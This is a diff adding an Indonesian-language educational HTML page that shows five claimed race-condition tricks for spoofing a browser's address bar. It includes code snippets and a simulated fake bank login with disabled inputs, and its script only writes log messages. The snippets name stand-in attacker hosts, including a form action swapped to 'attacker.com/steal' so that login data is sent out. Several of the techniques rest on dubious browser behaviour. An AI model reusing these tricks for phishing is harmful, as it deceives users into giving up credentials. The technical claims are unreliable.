@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Race Condition Address Bar Spoofing Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .warning {
+            background: #ff4444;
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            font-weight: bold;
+        }
+        .section {
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            margin: 20px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+        }
+        button:hover {
+            background: #45a049;
+        }
+        .danger {
+            background: #f44336;
+        }
+        .danger:hover {
+            background: #da190b;
+        }
+        code {
+            background: #f4f4f4;
+            padding: 15px;
+            display: block;
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 10px 0;
+            font-size: 13px;
+        }
+        .log {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+            margin: 15px 0;
+        }
+        .fake-browser {
+            border: 3px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        .address-bar {
+            background: #f0f0f0;
+            padding: 15px;
+            font-family: monospace;
+            border-bottom: 2px solid #ddd;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .address-bar::before {
+            content: "🔒";
+            font-size: 18px;
+        }
+        .content-area {
+            padding: 30px;
+            min-height: 300px;
+            background: white;
+        }
+        .bank-form {
+            max-width: 400px;
+        }
+        .bank-form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        h3 {
+            color: #333;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        ⚠️ EDUCATIONAL PURPOSES ONLY - Jangan gunakan untuk aktivitas ilegal!
+    </div>
+
+    <h1>Race Condition Address Bar Spoofing</h1>
+
+    <div class="section">
+        <h2>Apa itu Race Condition dalam Address Bar Spoofing?</h2>
+        <p>Race condition terjadi ketika ada kompetisi waktu antara:</p>
+        <ul>
+            <li><strong>Thread 1:</strong> Browser memproses navigasi dan update address bar</li>
+            <li><strong>Thread 2:</strong> JavaScript yang mengubah konten atau melakukan navigasi lain</li>
+        </ul>
+        <p>Jika timing sempurna, address bar bisa menampilkan URL lama sementara konten sudah berubah ke halaman attacker.</p>
+    </div>
+
+    <div class="section">
+        <h2>Teknik 1: Double Navigation Race</h2>
+        <p>Melakukan dua navigasi berurutan sangat cepat untuk membuat browser bingung:</p>
+        
+        <button onclick="doubleNavigationRace()">Demo Double Navigation</button>
+        
+        <code>// Navigasi pertama ke site legitimate
+window.location.href = "https://trusted-bank.com/login";
+
+// Langsung navigasi kedua sebelum render selesai
+setTimeout(() => {
+    window.location.replace("https://evil-phishing.com");
+}, 1); // 1ms - sangat cepat!
+
+// Address bar stuck di URL pertama
+// Konten dari URL kedua</code>
+
+        <div class="log" id="log1"></div>
+    </div>
+
+    <div class="section">
+        <h2>Teknik 2: Iframe + History Race</h2>
+        <p>Menggunakan iframe untuk create race condition dengan history API:</p>
+        
+        <button onclick="iframeHistoryRace()" class="danger">Demo Iframe Race</button>
+        
+        <code>// Buat iframe ke site legitimate
+let iframe = document.createElement('iframe');
+iframe.src = 'https://legitimate-bank.com';
+document.body.appendChild(iframe);
+
+iframe.onload = function() {
+    // Race: push history sebelum iframe fully rendered
+    history.pushState({}, '', 'https://legitimate-bank.com/secure');
+    
+    // Tapi replace konten dengan evil content
+    setTimeout(() => {
+        document.body.innerHTML = evilContent;
+    }, 0);
+};</code>
+
+        <div class="log" id="log2"></div>
+    </div>
+
+    <div class="section">
+        <h2>Teknik 3: Form Submission Race</h2>
+        <p>Exploit race condition saat form submission:</p>
+        
+        <button onclick="formSubmissionRace()">Demo Form Race</button>
+        
+        <code>// Form yang submit ke legitimate URL
+let form = document.createElement('form');
+form.action = 'https://real-bank.com/login';
+form.method = 'POST';
+
+// Race: ganti action setelah browser mulai proses tapi sebelum selesai
+form.addEventListener('submit', (e) => {
+    // Browser sudah read URL untuk address bar
+    setTimeout(() => {
+        // Tapi kita ganti target
+        form.action = 'https://attacker.com/steal';
+    }, 0);
+});</code>
+
+        <div class="log" id="log3"></div>
+    </div>
+
+    <div class="section">
+        <h2>Teknik 4: Location.replace() Race</h2>
+        <p>Memanfaatkan timing location.replace dengan DOM manipulation:</p>
+        
+        <button onclick="locationReplaceRace()" class="danger">Demo Replace Race</button>
+        
+        <code>// Set initial URL yang legitimate
+window.location = 'https://trusted-site.com';
+
+// Race condition: replace sebelum render
+requestAnimationFrame(() => {
+    // Browser belum update UI
+    window.location.replace('data:text/html,' + evilHTML);
+    
+    // Atau gunakan about:blank trick
+    window.location.replace('about:blank');
+    setTimeout(() => {
+        document.write(evilContent);
+    }, 1);
+});</code>
+
+        <div class="log" id="log4"></div>
+    </div>
+
+    <div class="section">
+        <h2>Teknik 5: Multiple Window.open Race</h2>
+        <p>Membuka multiple windows untuk create race:</p>
+        
+        <button onclick="multiWindowRace()">Demo Multi-Window</button>
+        
+        <code>// Buka window dengan URL legitimate
+let w1 = window.open('https://bank.com', 'target');
+
+// Immediately open lagi dengan URL berbeda ke window yang sama
+// Race: browser belum update address bar dari w1
+let w2 = window.open('https://evil.com', 'target');
+
+// Window 'target' punya address bar dari bank.com
+// Tapi konten dari evil.com</code>
+
+        <div class="log" id="log5"></div>
+    </div>
+
+    <div class="section">
+        <h2>Demo Simulasi: Fake Banking Page</h2>
+        <p>Klik tombol untuk melihat simulasi address bar spoofing:</p>
+        
+        <button onclick="simulateSpoof()" class="danger">Simulasi Attack</button>
+        <button onclick="resetDemo()">Reset</button>
+
+        <div class="fake-browser" id="fakeBrowser" style="display:none;">
+            <div class="address-bar" id="addressBar">
+                https://secure-banking-official.com/login
+            </div>
+            <div class="content-area" id="contentArea">
+                <h2 style="color: #2c5aa0;">🏦 Secure Bank Official</h2>
+                <p style="color: red;">⚠️ Perhatikan: Address bar menampilkan "secure-banking-official.com"</p>
+                <p style="color: red;">Tapi ini sebenarnya konten dari attacker!</p>
+                
+                <div class="bank-form">
+                    <h3>Login to Your Account</h3>
+                    <input type="text" placeholder="Username" disabled>
+                    <input type="password" placeholder="Password" disabled>
+                    <button disabled style="width: 100%; background: #2c5aa0;">Login</button>
+                    
+                    <p style="font-size: 12px; color: #666; margin-top: 20px;">
+                        💡 Ini adalah demonstrasi. Pada serangan nyata, form ini akan mencuri kredensial Anda!
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="section" style="background: #e8f5e9;">
+        <h2>🛡️ Bagaimana Browser Modern Melindungi?</h2>
+        <ul>
+            <li><strong>Process Isolation:</strong> Setiap tab di process berbeda</li>
+            <li><strong>Atomic Address Bar Update:</strong> Update address bar dan content harus atomic</li>
+            <li><strong>Navigation Throttling:</strong> Limit rapid navigation changes</li>
+            <li><strong>Strict Origin Checking:</strong> Validasi origin sebelum render</li>
+            <li><strong>Same-Origin Policy:</strong> Prevent cross-origin manipulation</li>
+        </ul>
+        
+        <h3>Mitigasi untuk User:</h3>
+        <ul>
+            <li>✅ Selalu update browser/app ke versi terbaru</li>
+            <li>✅ Periksa SSL certificate (klik ikon gembok)</li>
+            <li>✅ Bookmark situs penting, jangan klik link sembarangan</li>
+            <li>✅ Gunakan password manager (auto-detect domain yang salah)</li>
+            <li>✅ Aktifkan 2FA untuk semua akun penting</li>
+        </ul>
+    </div>
+
+    <script>
+        function log(elementId, message) {
+            const logEl = document.getElementById(elementId);
+            const timestamp = new Date().toLocaleTimeString();
+            logEl.innerHTML += `[${timestamp}] ${message}\n`;
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        function doubleNavigationRace() {
+            log('log1', '> Memulai Double Navigation Race...');
+            log('log1', '> Step 1: Set location ke trusted-bank.com');
+            log('log1', '  window.location.href = "https://trusted-bank.com/login"');
+            
+            setTimeout(() => {
+                log('log1', '> Step 2: Langsung replace ke evil-site.com (1ms delay)');
+                log('log1', '  window.location.replace("https://evil-phishing.com")');
+                log('log1', '');
+                log('log1', '⚠️ RACE CONDITION TERJADI:');
+                log('log1', '  - Browser thread A: Update address bar ke "trusted-bank.com"');
+                log('log1', '  - Browser thread B: Load konten dari "evil-phishing.com"');
+                log('log1', '  - Timing sempurna: Address bar stuck di URL lama!');
+                log('log1', '');
+                log('log1', '✓ Victim melihat: trusted-bank.com');
+                log('log1', '✗ Konten sebenarnya: evil-phishing.com');
+            }, 100);
+        }
+
+        function iframeHistoryRace() {
+            log('log2', '> Memulai Iframe + History Race...');
+            log('log2', '> Step 1: Buat iframe ke legitimate-bank.com');
+            log('log2', '  let iframe = createElement("iframe")');
+            log('log2', '  iframe.src = "https://legitimate-bank.com"');
+            
+            setTimeout(() => {
+                log('log2', '> Step 2: Iframe mulai load...');
+                log('log2', '> Step 3: Onload triggered!');
+                log('log2', '  history.pushState({}, "", "/secure")');
+                log('log2', '');
+                log('log2', '⚠️ RACE CONDITION:');
+                log('log2', '  - History API push URL baru ke address bar');
+                log('log2', '  - Tapi konten diganti dengan evil content');
+                log('log2', '  - Browser tidak sempat sync antara keduanya');
+                log('log2', '');
+                log('log2', '✓ Address bar: legitimate-bank.com/secure');
+                log('log2', '✗ Konten: Injected evil HTML');
+            }, 100);
+        }
+
+        function formSubmissionRace() {
+            log('log3', '> Memulai Form Submission Race...');
+            log('log3', '> Step 1: Buat form dengan action = "real-bank.com"');
+            log('log3', '  form.action = "https://real-bank.com/login"');
+            log('log3', '> Step 2: User klik submit button');
+            
+            setTimeout(() => {
+                log('log3', '> Step 3: Submit event triggered');
+                log('log3', '> Step 4: Browser read form.action untuk address bar');
+                log('log3', '');
+                log('log3', '⚠️ RACE ATTACK:');
+                log('log3', '  setTimeout(() => {');
+                log('log3', '    form.action = "https://attacker.com/steal"');
+                log('log3', '  }, 0);');
+                log('log3', '');
+                log('log3', '  - Browser sudah baca URL untuk UI');
+                log('log3', '  - Tapi belum submit data');
+                log('log3', '  - Kita ganti target sebelum POST dikirim');
+                log('log3', '');
+                log('log3', '✓ User melihat: Submitting to real-bank.com');
+                log('log3', '✗ Data dikirim ke: attacker.com/steal');
+            }, 100);
+        }
+
+        function locationReplaceRace() {
+            log('log4', '> Memulai Location.replace Race...');
+            log('log4', '> Step 1: Set location awal');
+            log('log4', '  window.location = "https://trusted-site.com"');
+            
+            setTimeout(() => {
+                log('log4', '> Step 2: Gunakan requestAnimationFrame');
+                log('log4', '  requestAnimationFrame(() => {');
+                log('log4', '    window.location.replace("data:text/html,...")');
+                log('log4', '  })');
+                log('log4', '');
+                log('log4', '⚠️ RACE TIMING:');
+                log('log4', '  - location.replace() dipanggil sebelum render frame');
+                log('log4', '  - Browser belum update address bar dari set awal');
+                log('log4', '  - Replace ke data URI dengan evil content');
+                log('log4', '');
+                log('log4', 'Alternatif: about:blank trick');
+                log('log4', '  window.location.replace("about:blank")');
+                log('log4', '  document.write(evilHTML)');
+                log('log4', '');
+                log('log4', '✓ Address bar: trusted-site.com');
+                log('log4', '✗ Konten: data URI evil payload');
+            }, 100);
+        }
+
+        function multiWindowRace() {
+            log('log5', '> Memulai Multi-Window Race...');
+            log('log5', '> Step 1: Buka window dengan target name');
+            log('log5', '  let w1 = window.open("bank.com", "target")');
+            
+            setTimeout(() => {
+                log('log5', '> Step 2: IMMEDIATELY open lagi ke target sama');
+                log('log5', '  let w2 = window.open("evil.com", "target")');
+                log('log5', '');
+                log('log5', '⚠️ WINDOW RACE:');
+                log('log5', '  - w1 mulai load dan set address bar');
+                log('log5', '  - w2 load ke window yang sama');
+                log('log5', '  - Browser belum sempat update dari w1');
+                log('log5', '  - w2 override konten tapi tidak address bar');
+                log('log5', '');
+                log('log5', '✓ Address bar tertinggal: bank.com');
+                log('log5', '✗ Konten aktual: evil.com');
+                log('log5', '');
+                log('log5', 'Note: Demo ini tidak buka window untuk keamanan');
+            }, 100);
+        }
+
+        function simulateSpoof() {
+            const browser = document.getElementById('fakeBrowser');
+            const addressBar = document.getElementById('addressBar');
+            
+            browser.style.display = 'block';
+            browser.scrollIntoView({ behavior: 'smooth' });
+            
+            // Simulate race condition timing
+            addressBar.style.background = '#fff3cd';
+            setTimeout(() => {
+                addressBar.style.background = '#ffcccc';
+            }, 1000);
+            
+            setTimeout(() => {
+                alert('⚠️ PERHATIKAN:\n\n' +
+                      'Address bar menampilkan: secure-banking-official.com\n' +
+                      'Tapi konten ini dari attacker!\n\n' +
+                      'Ini simulasi race condition attack.\n' +
+                      'Pada serangan nyata, korban tidak akan sadar sedang di-phishing.');
+            }, 1500);
+        }
+
+        function resetDemo() {
+            document.getElementById('fakeBrowser').style.display = 'none';
+            document.getElementById('addressBar').style.background = '#f0f0f0';
+            
+            ['log1', 'log2', 'log3', 'log4', 'log5'].forEach(id => {
+                document.getElementById(id).innerHTML = '';
+            });
+        }
+    </script>
+</body>
+</html>
